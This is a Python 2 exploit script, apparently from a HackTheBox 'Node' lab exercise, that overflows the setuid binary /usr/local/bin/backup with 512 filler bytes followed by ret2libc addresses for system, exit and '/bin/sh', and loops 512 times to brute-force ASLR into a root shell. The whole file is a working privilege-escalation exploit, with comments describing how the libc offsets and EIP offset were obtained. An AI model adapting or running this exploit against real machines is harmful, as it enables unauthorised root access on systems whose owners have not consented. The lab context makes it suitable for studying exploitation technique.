#!/usr/bin/python
# This is the finished overflow script we use on the binary on the target machine (Hackthebox Node)
# Check Ippsec's 'Hackthebox October' video

from subprocess import call
import struct

binaryLoc = "/usr/local/bin/backup"
arg1 = "randomText"
key = "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474"

libcBaseAddr = 0xf75b0000 #libc address 'ldd /home/user/binary | grep libc'

systemOffset = 0x0003a940 # system address 'readelf -s /lib32/libc.so.6 | grep system'
exitOffset   = 0x0002e7d0 # also from 'readelf -s ... | grep exit
argShOffset  = 0x00015900b # /bin/sh 'strings -a -t x /lib32/libc.so.6 | grep /bin/sh'

# '<I' stands for 'Little Endian' format
systemAddr = struct.pack("<I", libcBaseAddr + systemOffset)
exitAddr = struct.pack("<I", libcBaseAddr + exitOffset)
argAddr = struct.pack("<I", libcBaseAddr + argShOffset)

buf = "A" * 512 # 512 is the offset we found by checking gdb when the script overwrites the EIP
buf += systemAddr
buf += exitAddr
buf += argAddr

# print buf

# Bruteforce ASLR
i = 0
while (i <= 512):
    print "Try %s" %i
    i += 1
    ret = call([binaryLoc, arg1, key ,buf])
